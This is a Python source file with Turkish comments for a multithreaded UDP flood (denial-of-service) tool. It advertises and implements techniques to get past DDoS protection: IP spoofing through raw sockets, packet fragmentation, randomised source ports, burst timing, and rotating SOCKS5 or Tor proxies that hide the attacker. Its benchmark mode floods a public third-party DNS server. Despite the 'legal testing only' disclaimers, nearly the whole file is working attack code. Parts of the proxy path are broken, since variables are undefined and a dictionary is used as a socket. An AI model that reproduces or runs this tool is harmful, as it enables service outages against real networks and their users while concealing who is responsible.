#!/usr/bin/env python3
"""
UDP Flood Aracı - Yüksek Performanslı Python Thread Yöneticisi
Python thread'ler kullanarak yüksek performanslı UDP flood
⚠️ SADECE YASAL TEST VE EĞİTİM AMAÇLI KULLANIN!
⚠️ DDOS KORUMASINI AŞMAK İÇİN ÇEŞITLI TEKNİKLER İÇERİR
"""

import os
import sys
import time
import threading
import argparse
import signal
import socket
import atexit
import random
import struct
import socks
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

class FloodManager:
    def __init__(self, name="udp_flood"):
        self.name = name
        self.active_threads = []
        self.running = False
        self.total_packets = 0
        self.total_bytes = 0
        self.start_time = None
        self.thread_stats = {}
        self.stats_lock = threading.Lock()
        
        # DDoS koruması bypass ayarları
        self.use_random_source = False
        self.use_fragmentation = False
        self.use_spoofing = False
        self.delay_between_packets = 0
        self.burst_mode = False
        
        # SOCKS5 proxy ayarları
        self.use_proxy = False
        self.proxy_host = None
        self.proxy_port = None
        self.proxy_user = None
        self.proxy_pass = None
        self.proxy_list = []
        self.proxy_rotation = False
        
    def generate_random_payload(self, size=1024):
        """Her paket için rastgele payload oluştur"""
        return bytes(random.randint(0, 255) for _ in range(size))
    
    def create_fragmented_packet(self, payload, fragment_size=8):
        """Paketi parçalara böl (fragmentation)"""
        fragments = []
        for i in range(0, len(payload), fragment_size):
            fragment = payload[i:i+fragment_size]
            fragments.append(fragment)
        return fragments
    
    def get_random_source_port(self):
        """Rastgele kaynak port"""
        return random.randint(1024, 65535)
    
    def create_spoofed_socket(self):
        """IP spoofing için raw socket (Linux root gerekli)"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            return sock
        except:
            return None
    
    def send_udp_socks5(self, sock, udp_associate_addr, target_ip, target_port, payload):
        """SOCKS5 proxy üzerinden UDP paket gönder"""
        import struct
        rsv = b'\x00\x00'
        frag = b'\x00'
        atyp = b'\x01'
        addr = socket.inet_aton(target_ip)
        port = struct.pack('>H', target_port)
        header = rsv + frag + atyp + addr + port
        packet = header + payload
        sock.sendto(packet, udp_associate_addr)
    
    def flood_worker(self, worker_id, target_ip, target_port, duration=None):
        """UDP flood worker thread - DDoS koruması bypass teknikleri ile"""
        target = (target_ip, target_port)
        
        # Proxy seçimi
        proxy_info = None
        if self.use_proxy:
            if self.proxy_list:
                proxy_info = self.get_proxy_for_worker(worker_id)
                print(f"Worker {worker_id}: Proxy {proxy_info['host']}:{proxy_info['port']} kullanılıyor")
            else:
                proxy_info = {
                    'host': self.proxy_host,
                    'port': self.proxy_port,
                    'user': self.proxy_user,
                    'pass': self.proxy_pass
                }
                print(f"Worker {worker_id}: Tek proxy {proxy_info['host']}:{proxy_info['port']} kullanılıyor")
        
        # Socket oluştur (proxy varsa proxy socket)
        if proxy_info:
            sock = self.create_proxy_socket(proxy_info)
            if not sock:
                print(f"Worker {worker_id}: Proxy bağlantısı başarısız, normal socket kullanılıyor")
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                proxy_info = None  # Proxy başarısız, normal moda geç
        else:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        # Spoofing için raw socket dene (Linux root gerekli)
        raw_sock = None
        if self.use_spoofing and not proxy_info:  # Proxy ile spoofing çakışabilir
            raw_sock = self.create_spoofed_socket()
            if raw_sock:
                print(f"Worker {worker_id}: IP spoofing aktif")
        
        # Her thread için farklı kaynak port kullan (proxy yoksa)
        if self.use_random_source and not proxy_info:
            try:
                source_port = self.get_random_source_port()
                sock.bind(('', source_port))
                print(f"Worker {worker_id}: Kaynak port {source_port}")
            except:
                pass
        
        # Socket optimizasyonu (proxy değilse)
        if not proxy_info:
            try:
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4*1024*1024)  # 4MB
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2*1024*1024)  # 2MB
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                try:
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
                except:
                    pass
                sock.setblocking(False)
            except:
                pass  # Proxy socket'te çalışmayabilir
        
        packets = 0
        bytes_sent = 0
        start_time = time.time()
        burst_count = 0
        
        try:
            while self.running:
                if duration and (time.time() - start_time) > duration:
                    break
                
                # Burst mode - ani yoğun trafik
                if self.burst_mode:
                    burst_count += 1
                    if burst_count > 1000:  # 1000 paket sonra bekle
                        time.sleep(random.uniform(0.001, 0.01))
                        burst_count = 0
                
                # Her paket için rastgele payload
                if hasattr(self, 'use_random_payload') and self.use_random_payload:
                    payload = self.generate_random_payload()
                else:
                    payload = b'X' * 1024
                
                # Fragmentation kullan
                if self.use_fragmentation:
                    fragments = self.create_fragmented_packet(payload)
                    for fragment in fragments:
                        try:
                            sock.sendto(fragment, target)
                            packets += 1
                            bytes_sent += len(fragment)
                        except BlockingIOError:
                            continue
                        except Exception as e:
                            if packets % 5000 == 0 and not proxy_info:
                                print(f"Worker {worker_id} fragment error: {e}")
                            continue
                else:
                    # Normal gönderim
                    try:
                        if proxy_info:
                            send_udp_socks5(sock, udp_associate_addr, target_ip, target_port, payload)
                        else:
                            sock.sendto(payload, target)
                        packets += 1
                        bytes_sent += len(payload)
                    except BlockingIOError:
                        continue
                    except Exception as e:
                        # Proxy ile ilgili hataları daha az göster
                        if packets % 10000 == 0 and not proxy_info:
                            print(f"Worker {worker_id} error: {e}")
                        elif packets % 50000 == 0 and proxy_info:
                            print(f"Worker {worker_id} proxy error: {e}")
                        continue
                
                # Paketler arası gecikme (rate limiting bypass)
                if self.delay_between_packets > 0:
                    time.sleep(self.delay_between_packets)
                
                # İstatistikleri güncelle
                if packets % 10000 == 0:
                    with self.stats_lock:
                        self.thread_stats[worker_id] = {
                            'packets': packets,
                            'bytes': bytes_sent,
                            'elapsed': time.time() - start_time
                        }
                    
        except KeyboardInterrupt:
            pass
        finally:
            sock.close()
            if raw_sock:
                raw_sock.close()
            elapsed = time.time() - start_time
            print(f"Worker {worker_id} tamamlandı: {packets} paket, {elapsed:.1f}s")
            
            # Final istatistik
            with self.stats_lock:
                self.thread_stats[worker_id] = {
                    'packets': packets,
                    'bytes': bytes_sent,
                    'elapsed': elapsed,
                    'completed': True
                }
    
    def start_flood(self, target_ip, target_port, thread_count=10, duration=None, method="python", 
                   random_source=False, fragmentation=False, spoofing=False, delay=0, burst=False,
                   proxy_host=None, proxy_port=None, proxy_user=None, proxy_pass=None, 
                   proxy_file=None, proxy_rotation=False):
        """UDP flood saldırısını başlat - DDoS koruması bypass seçenekleri ile"""
        self.running = True
        self.start_time = time.time()
        
        # Bypass seçeneklerini ayarla
        self.use_random_source = random_source
        self.use_fragmentation = fragmentation
        self.use_spoofing = spoofing
        self.delay_between_packets = delay
        self.burst_mode = burst
        
        # Proxy ayarları
        if proxy_host and proxy_port:
            self.use_proxy = True
            self.proxy_host = proxy_host
            self.proxy_port = proxy_port
            self.proxy_user = proxy_user
            self.proxy_pass = proxy_pass
        
        # Proxy listesi yükle
        if proxy_file:
            if self.load_proxy_list(proxy_file):
                self.use_proxy = True
                self.proxy_rotation = proxy_rotation
            else:
                print("❌ Proxy listesi yüklenemedi, normal mod devam ediyor")
        
        print(f"\n{'='*60}")
        print(f"🚀 UDP FLOOD BAŞLATILIYOR (BYPASS MOD)")
        print(f"{'='*60}")
        print(f"🎯 Hedef: {target_ip}:{target_port}")
        print(f"🧵 Thread Sayısı: {thread_count}")
        print(f"⚡ Metod: {method}")
        
        # Proxy bilgisi
        if self.use_proxy:
            if self.proxy_list:
                print(f"🔄 Proxy: {len(self.proxy_list)} proxy listesi")
                print(f"🔄 Proxy Rotasyon: {'AKTİF' if self.proxy_rotation else 'RASTGELE'}")
            else:
                print(f"🔄 Proxy: {self.proxy_host}:{self.proxy_port}")
        
        # Bypass özellikleri
        if random_source:
            print(f"🔀 Rastgele kaynak port: AKTİF")
        if fragmentation:
            print(f"🧩 Paket parçalama: AKTİF")
        if spoofing:
            print(f"🎭 IP spoofing: AKTİF (Linux root gerekli)")
        if delay > 0:
            print(f"⏱️ Paket gecikme: {delay}s")
        if burst:
            print(f"💥 Burst modu: AKTİF")
        
        if duration:
            print(f"⏱ Süre: {duration} saniye")
        else:
            print(f"⏱ Süre: Sınırsız (Ctrl+C ile dur)")
        print(f"🕐 Başlangıç: {datetime.now().strftime('%H:%M:%S')}")
        print(f"{'='*60}")
        
        # Uyarı mesajı
        print(f"\n⚠️  DDoS KORUMASI BYPASS TEKNİKLERİ AKTİF!")
        print(f"⚠️  SADECE YASAL TEST İÇİN KULLANIN!")
        print(f"⚠️  YASA DIŞI KULLANIM YASAKTIR!")
        
        # Thread'leri başlat
        print(f"\n🏃 {thread_count} worker thread başlatılıyor...")
        
        with ThreadPoolExecutor(max_workers=thread_count) as executor:
            futures = []
            for i in range(thread_count):
                future = executor.submit(self.flood_worker, i, target_ip, target_port, duration)
                futures.append(future)
                self.active_threads.append(future)
                print(f"✅ Worker {i+1}/{thread_count} başlatıldı")
            
            print(f"\n🎉 {thread_count} worker thread aktif!")
            print(f"💡 Flood durumu takip ediliyor...")
            print(f"💡 Durdurmak için: Ctrl+C\n")
            
            # Ana döngü - istatistik göster
            try:
                if duration:
                    # Süre belirtilmişse countdown göster
                    remaining = duration
                    while self.running and remaining > 0:
                        self.show_duration_stats(remaining)
                        time.sleep(1)
                        remaining -= 1
                    
                    # Süre doldu
                    print(f"\n⏰ Süre tamamlandı ({duration} saniye)")
                    
                else:
                    # Sınırsız mod
                    while self.running:
                        self.show_stats()
                        time.sleep(1)
                        
            except KeyboardInterrupt:
                print("\n\n⛔ Flood durduruldu (Ctrl+C)")
            finally:
                # Her durumda temizlik yap (sadece bir kez)
                if self.running:
                    self.stop_flood()
                
                # Thread'lerin tamamlanmasını bekle (timeout ile)
                for future in futures:
                    try:
                        future.result(timeout=0.5)
                    except:
                        pass
        
        return True
    
    def stop_flood(self):
        """Flood'u durdur"""
        if not self.running:
            return  # Zaten durdurulmuş
            
        self.running = False
        print("\n🛑 Flood durduruluyor...")
        
        # Thread'lerin durması için kısa bekleme
        time.sleep(0.5)
        
        # Final istatistikleri göster
        self.show_final_stats()
        
        # Thread listesini temizle
        self.active_threads.clear()
        print("✅ Tüm thread'ler durduruldu!")
    
    def show_final_stats(self):
        """Final istatistikleri göster"""
        if not self.start_time:
            return
            
        total_packets = 0
        total_bytes = 0
        
        with self.stats_lock:
            for worker_id, stats in self.thread_stats.items():
                total_packets += stats.get('packets', 0)
                total_bytes += stats.get('bytes', 0)
        
        elapsed = time.time() - self.start_time
        
        print(f"\n📊 FINAL İSTATİSTİKLER:")
        print(f"📦 Toplam Paket: {total_packets:,}")
        print(f"📏 Toplam Byte: {total_bytes:,}")
        print(f"⏱ Toplam Süre: {elapsed:.1f}s")
        if elapsed > 0:
            pps = total_packets / elapsed
            bps = total_bytes / elapsed
            print(f"📈 Ortalama PPS: {pps:,.0f}")
            print(f"📈 Ortalama BPS: {bps:,.0f}")
    
    def show_stats(self):
        """Anlık istatistikleri göster"""
        if not self.start_time:
            return
        
        elapsed = time.time() - self.start_time
        active_count = len(self.active_threads)
        
        total_packets = 0
        with self.stats_lock:
            for stats in self.thread_stats.values():
                total_packets += stats.get('packets', 0)
        
        pps = total_packets / elapsed if elapsed > 0 else 0
        
        print(f"\r[{elapsed:.1f}s] 🧵 Aktif Thread: {active_count} | "
              f"📦 Paket: {total_packets:,} | "
              f"� PPS: {pps:,.0f} | "
              f"⚡ ÇALIŞIYOR", end="", flush=True)
    
    def show_duration_stats(self, remaining):
        """Süre ile beraber istatistikleri göster"""
        if not self.start_time:
            return
        
        elapsed = time.time() - self.start_time
        active_count = len(self.active_threads)
        
        total_packets = 0
        with self.stats_lock:
            for stats in self.thread_stats.values():
                total_packets += stats.get('packets', 0)
        
        pps = total_packets / elapsed if elapsed > 0 else 0
        
        print(f"\r[{elapsed:.1f}s] 🧵 Thread: {active_count} | "
              f"� Paket: {total_packets:,} | "
              f"� PPS: {pps:,.0f} | "
              f"⏰ Kalan: {remaining}s", end="", flush=True)
    
    def load_proxy_list(self, proxy_file):
        """Proxy listesi dosyasından proxy'leri yükle"""
        try:
            with open(proxy_file, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        # Format: host:port veya host:port:user:pass
                        parts = line.split(':')
                        if len(parts) >= 2:
                            proxy_info = {
                                'host': parts[0],
                                'port': int(parts[1]),
                                'user': parts[2] if len(parts) > 2 else None,
                                'pass': parts[3] if len(parts) > 3 else None
                            }
                            self.proxy_list.append(proxy_info)
            
            print(f"✅ {len(self.proxy_list)} proxy yüklendi")
            return len(self.proxy_list) > 0
        except Exception as e:
            print(f"❌ Proxy listesi yüklenemedi: {e}")
            return False
    
    def get_proxy_for_worker(self, worker_id):
        """Her worker için farklı proxy al"""
        if not self.proxy_list:
            return None
        
        if self.proxy_rotation:
            # Döngüsel proxy seçimi
            proxy = self.proxy_list[worker_id % len(self.proxy_list)]
        else:
            # Rastgele proxy seçimi
            proxy = random.choice(self.proxy_list)
        
        return proxy
    
    def create_proxy_socket(self, proxy_info):
        """SOCKS5 proxy socket oluştur - UDP desteği ile"""
        import struct
        try:
            tcp_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            tcp_sock.settimeout(5)
            tcp_sock.connect((proxy_info['host'], proxy_info['port']))
            # SOCKS5 handshake
            tcp_sock.sendall(b'\x05\x01\x00')
            resp = tcp_sock.recv(2)
            if resp != b'\x05\x00':
                tcp_sock.close()
                return None
            # UDP ASSOCIATE
            tcp_sock.sendall(b'\x05\x03\x00\x01\x00\x00\x00\x00\x00\x00')
            resp = tcp_sock.recv(10)
            if len(resp) < 10 or resp[1] != 0x00:
                tcp_sock.close()
                return None
            bind_addr = socket.inet_ntoa(resp[4:8])
            bind_port = struct.unpack('>H', resp[8:10])[0]
            tcp_sock.close()
            udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            udp_sock.settimeout(5)
            return {
                'udp_sock': udp_sock,
                'proxy_addr': (proxy_info['host'], proxy_info['port']),
                'udp_associate_addr': (bind_addr, bind_port)
            }
        except Exception as e:
            print(f"❌ Proxy UDP association başarısız: {e}")
            return None
    
    def test_proxy(self, proxy_info):
        """Proxy bağlantısını test et"""
        try:
            sock = self.create_proxy_socket(proxy_info)
            if not sock:
                return False
            
            # Test bağlantısı
            sock.settimeout(5)
            test_target = ('8.8.8.8', 53)
            sock.sendto(b'test', test_target)
            sock.close()
            return True
        except:
            return False
    
def cleanup_on_exit():
    """Program çıkışında temizlik yap"""
    if 'manager' in globals() and manager and manager.running:
        print("\n🧹 Program çıkışı - thread'ler temizleniyor...")
        manager.stop_flood()

def signal_handler(signum, frame):
    """Ctrl+C yakalamak için"""
    print("\n\n⛔ Flood durduruldu!")
    # Global manager varsa temizle
    if 'manager' in globals() and manager and manager.running:
        manager.stop_flood()
    sys.exit(0)

def main():
    parser = argparse.ArgumentParser(
        description="UDP Flood Aracı - Python Thread Yöneticisi",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Kullanım Örnekleri:
  python3 tmux_flood.py 192.168.1.1 80                     # Basit saldırı
  python3 tmux_flood.py 192.168.1.1 80 -t 20               # 20 thread
  python3 tmux_flood.py 192.168.1.1 80 -d 60               # 60 saniye
  python3 tmux_flood.py 192.168.1.1 80 --proxy 127.0.0.1:9050  # Tor proxy
  python3 tmux_flood.py 192.168.1.1 80 --proxy-list proxies.txt # Proxy listesi
  python3 tmux_flood.py 192.168.1.1 80 --stealth           # Stealth mod

Proxy Kullanımı:
  --proxy host:port                    # Tek SOCKS5 proxy
  --proxy host:port:user:pass          # Kimlik doğrulama ile
  --proxy-list proxies.txt             # Proxy listesi dosyası
  --proxy-rotation                     # Sıralı proxy kullanımı
  --proxy-test                         # Proxy listesini test et

Metodlar:
  python  - Python socket thread (varsayılan)

⚠️ SADECE YASAL TEST AMAÇLI KULLANIN!
        """)
    
    parser.add_argument('host', help='Hedef IP adresi')
    parser.add_argument('port', type=int, help='Hedef port numarası')
    parser.add_argument('-t', '--threads', type=int, default=10,
                       help='Thread sayısı (varsayılan: 10)')
    parser.add_argument('-d', '--duration', type=int,
                       help='Saldırı süresi (saniye)')
    parser.add_argument('-m', '--method', choices=['python'],
                       default='python', help='Flood metodu (varsayılan: python)')
    parser.add_argument('-n', '--name', default='udp_flood',
                       help='Flood adı (varsayılan: udp_flood)')
    
    # Yönetim komutları
    parser.add_argument('--benchmark', action='store_true',
                       help='10 saniye benchmark testi')
    
    # Bypass parametreleri
    parser.add_argument('--random-source', action='store_true',
                       help='Rastgele kaynak port kullan (rate limiting bypass)')
    parser.add_argument('--fragmentation', action='store_true',
                       help='Paket parçalama kullan (DPI bypass)')
    parser.add_argument('--spoofing', action='store_true',
                       help='IP spoofing kullan (Linux root gerekli)')
    parser.add_argument('--delay', type=float, default=0,
                       help='Paketler arası gecikme (saniye)')
    parser.add_argument('--burst', action='store_true',
                       help='Burst modu - ani yoğun trafik')
    parser.add_argument('--stealth', action='store_true',
                       help='Gizli mod - tüm bypass teknikleri')
    
    # SOCKS5 Proxy parametreleri
    parser.add_argument('--proxy', type=str, 
                       help='SOCKS5 proxy (host:port veya host:port:user:pass)')
    parser.add_argument('--proxy-list', type=str,
                       help='Proxy listesi dosyası (her satırda bir proxy)')
    parser.add_argument('--proxy-rotation', action='store_true',
                       help='Proxy rotasyonu (sıralı kullanım)')
    parser.add_argument('--proxy-test', action='store_true',
                       help='Proxy listesini test et')
    
    args = parser.parse_args()
    
    # Flood Manager oluştur (global olarak)
    global manager
    manager = FloodManager(args.name)
    
    # Çıkış temizliği kaydet
    atexit.register(cleanup_on_exit)
    
    # Signal handler (global manager ile)
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    # Benchmark modu
    if args.benchmark:
        print("🏁 Benchmark modu: 10 saniye test")
        args.duration = 10
        args.threads = 5
        # Test hedefi
        if args.host == "127.0.0.1":
            args.host = "8.8.8.8"
            args.port = 53
            print("⚠️ Benchmark için 8.8.8.8:53 hedefi kullanılıyor")
    
    # Parametreleri kontrol et
    if not (1 <= args.port <= 65535):
        print(f"❌ Geçersiz port: {args.port}")
        sys.exit(1)
    
    if args.threads < 1 or args.threads > 100:
        print(f"❌ Thread sayısı 1-100 arasında olmalı: {args.threads}")
        sys.exit(1)
    
    # Proxy ayarları işle
    proxy_host = None
    proxy_port = None
    proxy_user = None
    proxy_pass = None
    
    if args.proxy:
        proxy_parts = args.proxy.split(':')
        if len(proxy_parts) >= 2:
            proxy_host = proxy_parts[0]
            proxy_port = int(proxy_parts[1])
            if len(proxy_parts) >= 4:
                proxy_user = proxy_parts[2]
                proxy_pass = proxy_parts[3]
        else:
            print("❌ Proxy formatı: host:port veya host:port:user:pass")
            sys.exit(1)
    
    # Proxy test modu
    if args.proxy_test:
        print("🧪 Proxy test modu aktif")
        if args.proxy_list:
            temp_manager = FloodManager()
            if temp_manager.load_proxy_list(args.proxy_list):
                print("🧪 Proxy'ler test ediliyor...")
                working_proxies = []
                for i, proxy_info in enumerate(temp_manager.proxy_list):
                    print(f"Test {i+1}/{len(temp_manager.proxy_list)}: {proxy_info['host']}:{proxy_info['port']}", end="")
                    if temp_manager.test_proxy(proxy_info):
                        print(" ✅ ÇALIŞIYOR")
                        working_proxies.append(proxy_info)
                    else:
                        print(" ❌ ÇALIŞMIYOR")
                
                print(f"\n📊 Sonuç: {len(working_proxies)}/{len(temp_manager.proxy_list)} proxy çalışıyor")
                sys.exit(0)
            else:
                print("❌ Proxy listesi yüklenemedi")
                sys.exit(1)
        else:
            print("❌ Proxy test için --proxy-list parametresi gerekli")
            sys.exit(1)
    
    # Stealth mod (tüm bypass teknikleri)
    if args.stealth:
        print("🥷 Stealth mod aktif - tüm bypass teknikleri kullanılacak")
        args.random_source = True
        args.fragmentation = True
        args.burst = True
        args.delay = 0.001
        args.threads = min(args.threads, 50)  # Stealth için daha az thread
    
    # Flood başlat - direkt çalıştır
    try:
        success = manager.start_flood(
            target_ip=args.host,
            target_port=args.port,
            thread_count=args.threads,
            duration=args.duration,
            method=args.method,
            random_source=args.random_source,
            fragmentation=args.fragmentation,
            spoofing=args.spoofing,
            delay=args.delay,
            burst=args.burst,
            proxy_host=proxy_host,
            proxy_port=proxy_port,
            proxy_user=proxy_user,
            proxy_pass=proxy_pass,
            proxy_file=args.proxy_list,
            proxy_rotation=args.proxy_rotation
        )
        
        if success:
            print(f"\n🎉 Flood tamamlandı!")
        else:
            print(f"\n❌ Flood başlatılamadı!")
            sys.exit(1)
            
    except KeyboardInterrupt:
        print("\n⛔ Kullanıcı tarafından durduruldu")
        if manager.running:
            manager.stop_flood()
    except Exception as e:
        print(f"\n❌ Hata: {e}")
        if manager.running:
            manager.stop_flood()
        sys.exit(1)
    finally:
        # Her durumda temizlik yap (sadece gerekirse)
        if 'manager' in locals() and manager.running:
            manager.stop_flood()

if __name__ == "__main__":
    main()

